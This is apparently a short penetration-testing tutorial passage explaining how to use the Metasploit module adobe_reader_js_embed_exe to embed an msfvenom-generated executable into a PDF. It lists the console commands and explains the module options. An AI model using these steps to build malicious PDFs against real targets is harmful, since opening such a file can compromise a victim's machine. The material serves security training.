# Set the output PDF filename
msf6 exploit(windows/fileformat/adobe_reader_js_embed_exe) > set FILENAME malicious.pdf

# Set the path to your msfvenom-generated executable
msf6 exploit(windows/fileformat/adobe_reader_js_embed_exe) > set EXE::PATH /root/Documents/evil.exe

# Generate the malicious PDF
msf6 exploit(windows/fileformat/adobe_reader_js_embed_exe) > exploit
Module Options Explained
FILENAME

The name of the malicious PDF file that will be generated.

EXE::PATH

The full path to the executable payload created by `msfvenom`.

Embedding Exploit

Embedding Payloads in PDFs

Using Metasploit for File Format Exploits

Metasploit modules simplify the process of embedding `msfvenom` payloads into documents like PDFs.

  • •Utilizes modules like `adobe_reader_js_embed_exe`.
  • •Requires setting `FILENAME` and `EXE::PATH` options.
  • •Generated PDF attempts to execute payload when opened by vulnerable software.
Key Takeaway

Successfully embedding a payload creates the malicious file, but its execution still depends on a vulnerable target application.
